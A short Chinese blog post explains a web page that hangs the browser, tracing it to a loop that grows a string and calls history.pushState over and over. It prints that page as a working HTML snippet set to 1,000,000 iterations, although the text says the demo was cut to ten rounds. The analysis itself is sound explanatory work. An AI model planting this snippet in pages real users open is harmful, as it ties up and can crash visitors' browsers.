ailx10说：这篇是我2024年6月写的。那次顺着告警碰到一个奇怪网页，打开后地址不停变化，浏览器越来越难受。翻 HTML 才发现它在循环拼数字、不断调用 history.pushState，原理倒不复杂，次数一多却能把资源拖住。我没有照原规模继续跑，而是缩成十轮，在本地看清变化，把最小演示留在文章里。最初看着像神秘的“黑客网站”，拆开后其实是普通接口被重复使用的结果。这个从夸张现象退回几行代码的过程，正是我想记下来的部分。

原脚本循环累积字符串并调用 pushState。浏览器可能限频或抛出异常，不能保证每个环境都会崩溃。

```
<html>
  <body>
    <script>
      var total = "";
      for (var i = 0; i < 1000000; i++) {
        total = total + i.toString();
        history.pushState(0, 0, total);
      }
    </script>
  </body>
</html>
```

浏览器的频率限制和异常处理会改变结果，代码也不足以支持对站主身份的猜测。保留能复查的行为，比把一个可疑网页讲成完整人物故事更可靠。
